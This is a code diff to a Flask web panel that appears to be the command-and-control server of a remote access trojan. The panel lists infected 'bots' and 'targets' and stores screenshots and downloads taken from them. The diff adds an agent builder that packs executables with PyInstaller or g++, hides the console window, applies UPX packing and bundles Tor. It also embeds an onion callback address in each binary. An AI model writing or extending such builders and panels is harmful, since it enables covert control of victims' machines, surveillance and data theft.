@@ -1,4 +1,4 @@
-from flask import Flask, render_template, jsonify, request
+from flask import Flask, render_template, jsonify, request, send_from_directory
 import json
 import os
 import socket
@@ -8,6 +8,17 @@ import threading
 from werkzeug.utils import secure_filename
 from datetime import datetime
 import logging
+import signal
+import sys
+import subprocess
+import uuid
+
+# Add the current directory to Python path
+current_dir = os.path.dirname(os.path.abspath(__file__))
+if current_dir not in sys.path:
+    sys.path.insert(0, current_dir)
+
+from build_agent import setup_build_environment, append_address
 
 app = Flask(__name__)
 
@@ -101,11 +112,14 @@ def get_targets():
     targets = []
     for bot_id in Bot.botList:
         bot = Bot.botList[bot_id]
-        targets.append({
+        target_data = {
             'id': bot.id,
             'ip': str(bot.ip),
-            'alias': bot.alias
-        })
+            'alias': bot.alias,
+            'connected_time': bot.connected_time.isoformat(),
+            'os_type': bot.os_type
+        }
+        targets.append(target_data)
     return jsonify(targets)
 
 def allowed_file(filename):
@@ -195,12 +209,309 @@ def set_alias():
     Bot.botList[session_id].alias = new_alias
     return jsonify({'message': 'Alias updated successfully'})
 
+def create_dummy_agents():
+    """Create multiple dummy agents for UI testing"""
+    dummy_configs = [
+        {
+            'ip': ('192.168.1.100', 4444),
+            'alias': 'Windows Desktop',
+            'os': 'Windows 10'
+        },
+        {
+            'ip': ('192.168.1.101', 4445),
+            'alias': 'Linux Server',
+            'os': 'Ubuntu 20.04'
+        },
+        {
+            'ip': ('10.0.0.50', 4446),
+            'alias': 'MacBook Pro',
+            'os': 'macOS'
+        },
+        {
+            'ip': ('172.16.0.10', 4447),
+            'alias': 'Windows Server',
+            'os': 'Windows Server 2019'
+        },
+        {
+            'ip': ('192.168.2.200', 4448),
+            'alias': 'Kali Linux',
+            'os': 'Kali'
+        }
+    ]
+
+    class DummySocket:
+        def __init__(self, os_type='Windows'):
+            self.os_type = os_type
+            
+        def send(self, data):
+            return len(data)
+        
+        def recv(self, size):
+            # Simulate different responses based on commands
+            try:
+                command = json.loads(data.decode())
+                if command == 'help':
+                    return json.dumps("Available commands...").encode()
+                elif command == 'check':
+                    return json.dumps(f"Running as Administrator on {self.os_type}").encode()
+                elif command.startswith('cd '):
+                    return json.dumps(f"Changed directory to {command[3:]}").encode()
+                elif command == 'screenshot':
+                    return json.dumps("Screenshot captured").encode()
+                else:
+                    return json.dumps(f"Executed command: {command} on {self.os_type}").encode()
+            except:
+                return json.dumps("Command executed").encode()
+        
+        def close(self):
+            pass
+
+    # Create dummy agents
+    for config in dummy_configs:
+        dummy_socket = DummySocket(config['os'])
+        dummy_bot = Bot(dummy_socket, config['ip'])
+        dummy_bot.alias = config['alias']
+        dummy_bot.os_type = config['os']  # Add OS type to bot for UI
+        logging.info(f"Created dummy agent: {config['alias']} ({config['ip'][0]})")
+
 def start_server():
     global sock, t1
     sock = initialise_socket()
     t1 = threading.Thread(target=accept_connections)
     t1.start()
+    
+    # Add dummy agents for testing
+    if os.environ.get('TESTING_MODE', 'true').lower() == 'true':
+        create_dummy_agents()
+        logging.info("Created dummy agents for testing")
+
+# Add these functions for graceful shutdown
+def signal_handler(sig, frame):
+    logging.info("Received shutdown signal, cleaning up...")
+    shutdown_server()
+    sys.exit(0)
+
+def shutdown_server():
+    global start_flag, sock, t1
+    logging.info("Initiating server shutdown...")
+    
+    # Stop accepting new connections
+    start_flag = False
+    
+    # Close all active sessions
+    for session_id in list(Bot.botList.keys()):
+        try:
+            Bot.botList[session_id].kill()
+            logging.info(f"Terminated session {session_id}")
+        except Exception as e:
+            logging.error(f"Error terminating session {session_id}: {e}")
+    
+    # Close the socket
+    if sock:
+        try:
+            sock.close()
+            logging.info("Closed main socket")
+        except Exception as e:
+            logging.error(f"Error closing socket: {e}")
+    
+    # Wait for accept thread to finish
+    if t1 and t1.is_alive():
+        try:
+            t1.join(timeout=5)
+            logging.info("Accept thread terminated")
+        except Exception as e:
+            logging.error(f"Error joining accept thread: {e}")
+    
+    logging.info("Server shutdown complete")
+
+# Add these routes
+@app.route('/api/build_agent', methods=['POST'])
+def build_agent():
+    data = request.get_json()
+    build_id = str(uuid.uuid4())
+    
+    # Start build process in background
+    thread = threading.Thread(
+        target=build_agent_process,
+        args=(build_id, data)
+    )
+    thread.start()
+    
+    return jsonify({
+        'status': 'building',
+        'build_id': build_id
+    })
+
+@app.route('/api/build_status/<build_id>')
+def build_status(build_id):
+    status = get_build_status(build_id)
+    return jsonify(status)
+
+@app.route('/download/<filename>')
+def download_file(filename):
+    return send_from_directory('dist', filename)
+
+# Build process tracking
+build_processes = {}
+
+def build_agent_process(build_id, data):
+    try:
+        build_processes[build_id] = {
+            'state': 'building',
+            'progress': 0,
+            'status': 'Setting up build environment...'
+        }
+        
+        # Setup build environment
+        if not setup_build_environment(data['language']):
+            raise Exception("Failed to setup build environment")
+        
+        # Create agent configuration
+        agent_config = {
+            'language': data['language'],
+            'onion_address': data['onion_address'],
+            'port': data['port'],
+            'skills': data['skills']
+        }
+        
+        # Write configuration
+        with open('agent_config.json', 'w') as f:
+            json.dump(agent_config, f)
+            
+        build_processes[build_id]['progress'] = 20
+        build_processes[build_id]['status'] = 'Building agent...'
+        
+        # Build command based on language
+        if data['language'] == 'python':
+            cmd = [
+                'pyinstaller',
+                'agent.py',
+                '--onefile',
+                '--clean',
+                '--add-data=agent_config.json;.'
+            ]
+        else:  # C++
+            cmd = [
+                'g++',
+                'agent.cpp',
+                '-o',
+                'agent',
+                '-std=c++17'
+            ]
+        
+        # Add platform specific options
+        if data['language'] == 'python':
+            if data['options']['noconsole']:
+                cmd.append('--noconsole')
+                
+            if data['platform'] == 'windows':
+                cmd.extend(['--add-data=torbundle;torbundle'])
+                if data['options']['upx']:
+                    cmd.extend(['--upx-dir=upx-3.96-win64'])
+            else:
+                cmd.extend(['--add-data=torbundle:torbundle'])
+        
+        # Run build
+        process = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        
+        stdout, stderr = process.communicate()
+        
+        if process.returncode != 0:
+            raise Exception(stderr.decode())
+            
+        build_processes[build_id]['progress'] = 80
+        build_processes[build_id]['status'] = 'Finalizing build...'
+        
+        # Get output filename
+        output_file = os.path.join('dist', 'agent.exe' if data['platform'] == 'windows' else 'agent')
+        
+        # Append address to executable
+        if not append_address(output_file, data['onion_address'], int(data['port'])):
+            raise Exception("Failed to append address to executable")
+        
+        build_processes[build_id] = {
+            'state': 'complete',
+            'progress': 100,
+            'status': 'Build complete',
+            'filename': 'agent.exe' if data['platform'] == 'windows' else 'agent'
+        }
+        
+    except Exception as e:
+        build_processes[build_id] = {
+            'state': 'error',
+            'progress': 0,
+            'status': 'Build failed',
+            'error': str(e)
+        }
+
+def get_build_status(build_id):
+    return build_processes.get(build_id, {
+        'state': 'error',
+        'progress': 0,
+        'status': 'Build not found'
+    })
+
+@app.route('/api/storage')
+def get_storage():
+    storage_data = {
+        'downloads': get_files_in_directory('downloads'),
+        'screenshots': get_files_in_directory('images/screenshots'),
+        'uploads': get_files_in_directory('uploads')
+    }
+    return jsonify(storage_data)
+
+@app.route('/api/delete_file', methods=['POST'])
+def delete_file():
+    data = request.get_json()
+    path = data.get('path')
+    
+    # Validate path is within allowed directories
+    if not is_safe_path(path):
+        return jsonify({'error': 'Invalid path'}), 400
+        
+    try:
+        os.remove(path)
+        return jsonify({'message': 'File deleted successfully'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+def get_files_in_directory(directory):
+    files = []
+    if os.path.exists(directory):
+        for filename in os.listdir(directory):
+            filepath = os.path.join(directory, filename)
+            if os.path.isfile(filepath):
+                files.append({
+                    'name': filename,
+                    'path': filepath,
+                    'size': os.path.getsize(filepath),
+                    'modified': os.path.getmtime(filepath)
+                })
+    return files
+
+def is_safe_path(path):
+    base_dir = os.path.abspath(os.path.dirname(__file__))
+    file_path = os.path.abspath(path)
+    return base_dir in file_path
 
 if __name__ == '__main__':
-    start_server()
-    app.run(debug=True, use_reloader=False) 
+    try:
+        # Register signal handler
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+        
+        # Start server
+        start_server()
+        logging.info("Server started successfully")
+        
+        # Run Flask app
+        app.run(debug=True, use_reloader=False)
+    except Exception as e:
+        logging.error(f"Unexpected error: {e}")
+        shutdown_server()
+    finally:
+        logging.info("Server stopped") 
